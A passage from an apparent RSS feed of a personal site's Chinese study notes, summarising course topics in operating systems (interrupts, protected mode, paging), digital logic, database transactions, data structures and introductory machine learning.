发生中断时，保存现场；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8/</guid><description>中断与异常 # 简述 # 中断引入的目的：
CPU 需要与外设进行交流。 因为 CPU 与外设存在显著的速度差异，如果使用轮询的方式则太浪费 CPU 资源了。 引入中断机制解决了上面两个问题，但是导致操作系统的理解更加困难。 在操作系统中，有三种特殊的中断事件：
由 CPU 外部设备引起的外部事件，简称中断 (interrupt) 比如：IO 中断、时钟中断、控制台中断。 因为它的产生与 CPU 的执行无关，我们也称它为异步中断。 把在 CPU 执行指令期间检测到不正常或非法的条件所引起的内部事件称作异常 (exception) 比如：除零错误、地址访问越界。 这类 CPU 内部事件导致的称谓同步中断，也称哪部中断 在程序中使用请求系统服务而引发，称作陷入中断 (trap interrupt)、也称软中断、系统调用。 处理中断的的流程大致如下：
CPU 收到中断 (8259A) 或者异常的事件时，它会暂定执行当前的程序或任务； CPU 通过 IDT（Interrupt Descriptor Table，存储着中断向量与中断服务例程的对应关系）查询处理中断的例程，IDT 是中断处理的核心结构； 执行例程完成后跳回被打断的程序。 中断描述符表 IDT # IDT 中的中断描述符可以分为三种：
Task Gate、Interrupt Gate、Trap Gate 下面是这三种中断描述符的结构：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%88%86%E6%AE%B5%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%88%86%E6%AE%B5%E6%A8%A1%E5%BC%8F/</guid><description>保护模式与分段模式 # 简介 # 为什么要有保护模式？
Intel 80386 只有在保护模式下，才可以提供更好的保护机制和更大的寻址空间； 没有保护机制，任何应用软件都可以任意地访问所有计算机资源； 许多操作系统功能（比如分页）都是建立在保护模式上设计的； 实模式 # bootloader 在 BIOS 之后开始运行时，PC 处于 16 位实模式运行状态。
它主要有以下特点：
实模式下，上层软件可以访问的物理内存空间不超过 1MB；
实模式将整个物理内存看成分段的区域，每一个指针都是指向实际的物理内存。
通过修改 A20 地址线可以完成从实模式到保护模式的切换。
保护模式 # 概念 # GDT 与 LDT：
保护模式下，有两个段表：GDT（Global Descriptor Table）和 LDT（Local Descriptor Table） 段描述符：GDT 表的内容；
为了兼容各个不同版本的 CPU，它的形式比较复杂； 它最重要的字段是 segment base 与 segment limit； 也称之为段，此处的段与 ELF 源程序中的 .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E5%88%86%E9%A1%B5%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C%E9%A1%B9%E7%9B%AE%E7%BB%84%E6%88%90/%E5%88%86%E9%A1%B5%E6%8A%80%E6%9C%AF/</guid><description>参考：
https://stackoverflow.com/questions/29945171/difference-between-page-table-and-page-directory 分页技术 # 设计 # 下面一张图可以展示分页技术的层级设计过程：
概念 # 页 (Page)：
在进程的逻辑地址中，一段连续地址的集合。 页的大小一般提供三种规格：4K、2M、4M Frame：
在内存的物理地址中，一段连续地址的集合。 一个 Page 与一个对应的 Frame 对应，Frame 的大小与 Page 也是相同的。 页表 (Page Table) 与页目录 (Page Directory)：
页表：是一个有 1024 个 32-bit 元素的列表，每一个元素都指向一个真实的物理地址；
如果页表大小为 4K，我们只能表示 1024 * 4K = 2^22，22-bit 的逻辑地址。而我们需要 4G = 32-bit 的逻辑地址。因此如果只有一个页表，我们无法表示整个逻辑地址空间。
页目录：因为页表无法映射所有逻辑地址而产生的二级目录，它也是一个有 1024 个 32-bit 元素的列表，每一个元素都指向一个页表的地址；
页表和页目录项一起工作，我们即可以映射整个 4G = 32-bit 的逻辑地址。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</guid><description>期末复习 # 概念 # 快表，TLB（Translation Look-aside Buffer）：
反置页表
缺页中断 # 缺页中断的处理流程：
在内存中有空闲物理页面时，分配一物理页帧 f，转第 5 步； 依据 页面置换算法 选择将被替换的物理页帧 f，对应逻辑页 q； 如果 q 被修改过，则把它写回外存； 修改 q 的页表项中驻留位置为 0； 将需要访问的页 p 装入到物理页面 f； 修改 p 的页表项驻留位为 1，物理页帧号为 f； 重新执行产生缺页的指令； 进程间通信 # 进程间通信（InterProcess Communication）有哪些方式？
信号：信号是 Linux 系统中用于进程之间通信或操作的一种机制
信号可以在任何时候发送给某一进程，而无须知道该进程的状态。
如果该进程并未处于执行状态，则该信号就由内核保存起来，知道该进程恢复执行并传递给他为止。
如果一个信号被进程设置为阻塞，则该信号的传递被延迟，直到其阻塞被取消时才被传递给进程。
管道：管道是 Linux 支持的最初 Unix IPC 形式之一
管道是半双工的，数据只能向一个方向流动；需要双方通信时，需要建立起两个管道；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8D%A1%E8%AF%BA%E5%9B%BE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8D%A1%E8%AF%BA%E5%9B%BE/</guid><description>卡诺图 # n 个变量的卡诺图中最小项的合并规律如下：
卡诺图中小方格的个数必须为 $$2^m$$ 个（$$m \in \mathbb{Z}, m \le n$$） 卡诺圈中的 $$2^m$$ 个小方格有一定的排列规律，他们含有 m 个不同变量，（n-m）个相同变量。 卡诺圈中的 $$2^m$$ 个小方格对应的最小项可以用 （n-m）个变量的与项表示，该与项由这些最小项中的相同部分组成。 当 m = 0 时，卡诺圈包含一个最小项；当 m = n 时，卡诺圈包围了整个卡诺图，可用 1 表示.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%8F%AF%E7%BC%96%E7%A8%8B%E9%80%BB%E8%BE%91%E5%99%A8%E4%BB%B6/</guid><description>学习途径：
欧阳星明、华中科技大学出版社 《数字逻辑》 低密度可编程逻辑器件 # 可编程只读存储器 # 1. 半导体存储器分类 # 按功能分类可以分为随机存取存储器 RAM（Random Access Memory, RAM）和只读存储器 ROM（Read Only Memory）两大类。
RAM 是一种既可读又可写的存储器，故称为读写存储器。
优点是读写方便，使用灵活 缺点是一旦断点，所存储的信息便会丢失，它属于易失性存储器。 ROM 是一种在正常工作时只能读出、不能写入的存储器。
只读存储器存储属于的过程通常称为编程，根据编程方法的不同可以分为：掩膜编程 ROM（MROM）和用户可编程 ROM 两类。
只读存储器 ROM 属于非易失性存储器，即使切断电源，ROM 内的信息也不会丢失。
2. 可编程 ROM 的结构 # 可编程 ROM 主要由地址译码器和存储体两大部分组成：
其中：
$$A_0, A_1, &amp;hellip;, A_{n-1}$$ 称为地址输入线； $$W_0, W_1, &amp;hellip;, W_{2^n-1}$$ 称为地址译码输出线，一般称为字线； $$D_0, D_1, &amp;hellip;, D_{m-1}$$ 称为数据输出线，一般称为位线。 其实现方式，上半部分是一个与阵列构成的全地址译码器，下半部分是一个或阵列构成的网络：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%90%8C%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</guid><description>学习途径：
欧阳星明、华中科技大学出版社 《数字逻辑》 同步时序逻辑电路设计 # 设计的一般步骤：
完全确定同步时序逻辑电路设计 # 1. 形成原始状态图和原始状态表 # 一般步骤：
确定电路模型：Mealy 模型、Moore 模型。 设立初始状态 根据需要记忆的信息增加新的状态 确定各时刻电路的输出 例子：
设计一个模 5 可逆计数器，该电路有一个输入 x 和一个输出 Z。x=0 表示加控制信号，x=1 表示减控制信号。输出 Z 表示借位或进位信号。尝试建立该计数器的 Mealy 型原始状态图和状态表。
假设计数器的 5 个状态分别为 0、1、2、3、4，其中 0 表示初始状态。原始状态表如下所示：
当前状态 次态/输出 Z 次态/输出 Z x=0 x=1 0 1/0 4/1 1 2/0 0/0 2 3/0 1/0 3 4/0 2/0 4 0/1 3/0 2.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E5%BC%82%E6%AD%A5%E6%97%B6%E5%BA%8F%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/</guid><description>学习途径：
欧阳星明、华中科技大学出版社 《数字逻辑》 异步时序逻辑电路 # 脉冲异步时序逻辑电路分析 # 分析步骤如下：
写出电路的输出函数和激励函数表达式 列出电路的次态真值表或次态方程组 作出状态表和状态图 画出时间图并用文字描述电路的逻辑功能 例子：
分析下图所示的脉冲异步时序逻辑电路，指出该电路的主要功能：
STEP 1：写出输出函数和激励函数表达式：
输出函数：$$Z = x \cdot y_2 \cdot y_1$$ JK1 激励函数：$$J_1=K_1=1, C_1 = x$$ JK2 激励函数：$$J_2=K_2=1, C_2 = y_1$$ STEP 2：列出电路的次态真值表或次态方程组：
由 STEP 1 中的分析可知，两个 JK 触发器均工作在计数状态，即恒有：$$Q^{n+1} = \overline{Q^n}$$。所以次态真值表（x=1）：
现态 现态 次态 次态 $$y_2$$ $$y_1$$ $$y_2^{n+1}$$ $$y_1^{n+1}$$ 0 0 0 1 0 1 1 0 1 0 1 1 1 1 0 0 STEP 3：做出状态表和状态图：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E6%95%B0%E5%88%B6%E4%B8%8E%E7%BC%96%E7%A0%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E6%95%B0%E5%88%B6%E4%B8%8E%E7%BC%96%E7%A0%81/</guid><description>学习途径：
欧阳星明、华中科技大学出版社 《数字逻辑》 数制与编码 # 数制与转换 # 广义的说，一种进位数制包含着基数和位权两个基本要素：
基数：是指计数制中所用到的数字符号的个数。基数为 R 的计数制称为 R 进位计数制，简称 R 进制。
位权：在一种进位计数制表示的数中，用来表示不同数位上数值大小的一个固定常数。
一般来说，一个 R 进制数 N 可以有以下两种表示方法：
并列表示法，又称为位置计数法，其表达式为：$$(N)R = (K{n-1}K_{n-2}&amp;hellip;K_1K_0 . K_{-1}&amp;hellip;K_{-m})_R$$ 多项式表示法，又称按权展开法，其表达式为：$$\displaystyle (N)R = \sum{i=-m}^{n-1} K_iR^i$$ 带符号二进制数的表示 # 原码 # 二进制小数 $$X = \pm 0.x_{-1}x_{-2}&amp;hellip;x_{-m}​$$，原码定义为：$$\displaystyle [X]_{原} = \begin{cases} X &amp;amp;, 0 \le X &amp;lt; 1 \ 1 - X &amp;amp;, -1 &amp;lt; X \le 0\end{cases}​$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E8%A7%A6%E5%8F%91%E5%99%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/%E8%A7%A6%E5%8F%91%E5%99%A8/</guid><description>学习地址：http://210.45.192.19/kecheng/2004/11/courseware/chapter4.ppt
触发器 # 分类 # 按动作特点分类：基本 RS 触发器、同步 RS 触发器、主从触发器、边沿触发器
按功能分类：RS 触发器、JK 触发器、D 触发器、T 触发器
1. 基本 RS 触发器 # 1.1 电路结构 # 1.2 动作特点 # 功能表：
R S Qn+1 功 能 0 0 ╳ 不 定 0 1 0 置 “0” 1 0 1 置 “1” 1 1 Qn 保 持 $$Q_{n+1}$$ 卡诺图：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/</guid><description>参考：
https://www.zhihu.com/question/31346392
https://github.com/CyC2018/CS-Notes/blob/master/notes/数据库系统原理.md
https://www.jianshu.com/p/f692d4f8a53e
数据库系统原理 # 事务 # 为什么会出现事务（Transaction）？
为了当应用程序访问数据库的时候，事务能够简化我们的编程模型。 应用层不需要去考虑各种各样的潜在错误（网络错误、服务器宕机等）和并发问题； 什么是事务？
满足 ACID 四个特性的一组操作； 可以通过 commit 操作结束一个事务，也可以通过 RollBack 操作回滚到事务的开始； ACID：
原子性（Atomicity）：事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚（可以通过 undo log 实现）。 一致性（Consistency）：事务执行前后的状态都是正确的，事务操作应当将数据库从一个正确状态转移到另一个正确状态； 隔离性（Isolation）：降低并发事务之间的影响程度； 持久性（Durability）：一旦事务提交，则其所做的修改将会永远保存到数据库中；若系统发生崩溃，可以通过 redo log 重做； 并发问题 # 并发导致的一致性问题：
丢失修改：并发进行的事务对同一个数据进行修改，后者覆盖了前者的内容；
脏读：事务 A 修改了一个数据，但未提交；事务 B 读到了事务 A 未提交的更新结果，如果事务 A 提交失败进行了回滚，事务 B 读到的就是脏数据。
不可重复读：在同一个事务中，对于同一份数据读取到的结果不一致。比如，事务 B 在事务 A 提交前读到的结果，和提交后读到的结果可能不同。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/b-tree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/b-tree/</guid><description>学习链接：
https://www.geeksforgeeks.org/b-tree-set-1-introduction-2/ https://www.geeksforgeeks.org/b-tree-set-1-insert-2/ B-Tree # Introduction # Defination:
B-Tree is a self-balancing search tree. In most of the other self-balancing search trees (like AVL and Red-Black Trees), it is assumed that everything is in main memory.
Usage:
Disk access time is very high compared to main memory access time. The main idea of using B-Trees is to reduce the number of disk accesses.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/bintree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/bintree/</guid><description>Chapter 10&amp;ndash;Binary Trees # Binary Trees # Definitions # Binary Tree:
A binary tree is either empty, or it consists of a node called the root together with two binary trees called the left subtree and the right subtree of the root.
Empty Tree: The first case, the base case that involves no recursion, is that of an empty binary tree. The empty tree will usually be the base case for recursive algorithms and will determine when the algorithm stops.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/dictionary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/dictionary/</guid><description>字典 # ADT 抽象数据类型 # ADT dictionary
{
DATA:
data_pair key_value[];
METHOD:
empty(): return true if key_value is empty.
size(): return size of key_value.
find(k): return pointer in key_value whose key is k.
insert(p): insert data_pair p into key_value.
erase(k): erase data_pair from key_value where its key is k.
} 线性表表示 # 两个类 sortedArrayList 和 sortedChain 分别存储键和值。
跳表表示 # 跳跃表（skiplist）是一种随机化的数据， 由 William Pugh 在论文《Skip lists: a probabilistic alternative to balanced trees》中提出， 跳跃表以有序的方式在层次化的链表中保存元素， 效率和平衡树媲美 —— 查找、删除、添加等操作都可以在对数期望时间下完成， 并且比起平衡树来说， 跳跃表的实现要简单直观得多。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/priorityqueue/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/priorityqueue/</guid><description>优先级队列 # ADT 抽象数据类型 # ADT maxPriorityQueue
{
DATA:
element ele_queue[];
METHOD:
empty(): return true if ele_queue is empty.
size(): return size of ele_queue.
top(): return the element with max priority.
pop(): delete the element with max priority.
push(x): push element &amp;#34;x&amp;#34;.
} 堆 # 概念：大根堆，小根堆。
左高树 # 概念：
外部结点（external node）：加入在树中所有空子树的结点。
内部结点（internal node）：原本就存在的结点。
扩充二叉树（extended binary tree）：增加了外部节点的二叉树。
令 s(x) 是从结点 x 到其子树的外部节点的所有路径中最短的一条，则：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/review/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/review/</guid><description>REVIEW # 1. 基本知识 # 维基百科上列出了下面的时间复杂度种类：
名称 运行时间（$${\displaystyle T(n)}$$） 算法举例 常数时间 $${\displaystyle O(1)}$$ 判断一个二进制数的奇偶 反阿克曼时间 $${\displaystyle O(\alpha (n))}$$ 并查集的单个操作的平摊时间 迭代对数时间 $${\displaystyle O(\log ^{*}n)}$$ 分布式圆环着色问题 对数对数时间 $${\displaystyle O(\log \log n)}$$ 有界优先队列的单个操作 对数时间 $${\displaystyle O(\log n)}$$ 二分搜索 幂对数时间 $${\displaystyle (\log n)^{O(1)}}$$ （小于1次）幂时间 $${\displaystyle O(n^{c})}$$，其中$${\displaystyle 0&amp;lt;c&amp;lt;1}$$ K-d 树的搜索操作 线性时间 $${\displaystyle O(n)}$$ 无序数组的搜索 线性迭代对数时间 $${\displaystyle O(n\log ^{*}n)}$$ 莱姆德·赛德尔的三角分割多边形算法 线性对数时间 $${\displaystyle O(n\log n)}$$ 最快的比较排序 二次时间 $${\displaystyle O(n^{2})}$$ 冒泡排序、插入排序 三次时间 $${\displaystyle O(n^{3})}$$ 矩阵乘法的基本实现，计算部分相关性 多项式时间 $${\displaystyle 2^{O(\log n)}=n^{O(1)}}$$ 线性规划中的卡马卡算法，AKS 质数测试 准多项式时间 $${\displaystyle 2^{(\log n)^{O(1)}}}$$ 关于有向斯坦纳树问题最著名的$${\displaystyle O(\log ^{2}n)}!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/searchtree/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/searchtree/</guid><description>搜索树 # 二叉搜索树 BST # 满足以下特性的二叉树是棵二叉搜索树（Binary Search Tree）：
每个元素有一个关键字，并且任意两个元素的关键字都不同；因此所有关键字都是唯一的； 在根节点的左子树中，元素的关键字（如果有的话）都小于根节点的关键字； 在根节点的右子树中，元素的关键字（如果有的话）都大于根节点的关键字； 根节点的左右子树也都是二叉搜索树。 AVL 搜索树 # AVL 树是 Adelson-Velskii 和 Landis 在 1962 年提出的：
AVL 搜索树是一棵二叉搜索树 左右子树的高分别为 $$h_L, h_R$$，则 AVL 搜索树有：$$|h_L - h_R| \le 1$$ AVL 搜索树根节点的左子树和右子树也是 AVL 搜索树。 红黑树 # 红黑树：
红黑树是一个带有颜色的二叉查找树，所有结点均是红色或黑色； 根是黑色； 所有叶子都是黑色（叶子结点是外部结点）； 每个红色结点必须有两个黑色结点； 从任一节点到其每个叶子的简单路径都包含相同数量的黑色结点。 B-树 # 根据 Knuth 的定义，一个 m 阶的B树是一个有以下属性的树：
每个节点最多有 m 个子节点； 每个非叶子节点（除根节点）最少有 $$\displaystyle [\frac{m}{2}] $$ 个子节点； 如果根节点不是叶子节点，那么它至少有两个子节点； 有 k 个子节点的非叶子节点拥有 k − 1 个键； 所有的叶子节点都在同一层。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/1.framing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/1.framing/</guid><description>问题构建 # 主要术语，全部。
标签 # 标签是我们要预测的事物，即简单线性回归中的 y 变量。
标签可以是小麦未来的价格、图片中显示的动物品种、音频剪辑的含义或任何事物。
特征 # 特征是输入变量，即简单线性回归中的 x 变量。简单的机器学习项目可能会使用单个特征，而比较复杂的机器学习项目可能会使用数百万个特征，按如下方式指定：$$x_1, x_2, &amp;hellip; x_n$$
样本 # 样本是指数据的特定实例：x。（我们采用粗体 x 表示它是一个矢量。）我们将样本分为以下两类：有标签样本、无标签样本
有标签样本同时包含特征和标签。即：
labeled examples: {features, label}: (x, y) 我们使用有标签样本来训练模型。在我们的垃圾邮件检测器示例中，有标签样本是用户明确标记为 “垃圾邮件” 或 “非垃圾邮件” 的各个电子邮件。
无标签样本包含特征，但不包含标签。即：
unlabeled examples: {features, ?}: (x, ?) 在使用有标签样本训练模型之后，我们会使用该模型预测无标签样本的标签。在垃圾邮件检测器示例中，无标签样本是用户尚未添加标签的新电子邮件。
模型 # 模型定义了特征与标签之间的关系。
模型生命周期的两个阶段：
训练是指创建或学习模型。也就是说，向模型展示有标签样本，让模型逐渐学习特征与标签之间的关系。 推断是指将训练后的模型应用于无标签样本。也就是说，使用经过训练的模型做出有用的预测 (y')。 回归与分类 # 回归模型可预测连续值。例如，回归模型做出的预测可回答如下问题：
加利福尼亚州一栋房产的价值是多少？ 用户点击此广告的概率是多少？ 分类模型可预测离散值。例如，分类模型做出的预测可回答如下问题：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/10.regularization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/10.regularization/</guid><description>正则化 # 概述 # 降低复杂模型的复杂度来防止过拟合，这种原则称为正则化。
也就是说，并非只是以最小化损失（经验风险最小化）为目标：$$minimize(Loss(Data[Model]))$$
而是以最小化损失和复杂度为目标，这称为结构风险最小化：$$minimize(Loss(Data[Model]) + complexity(Model))$$
现在，我们的训练优化算法是一个由两项内容组成的函数：
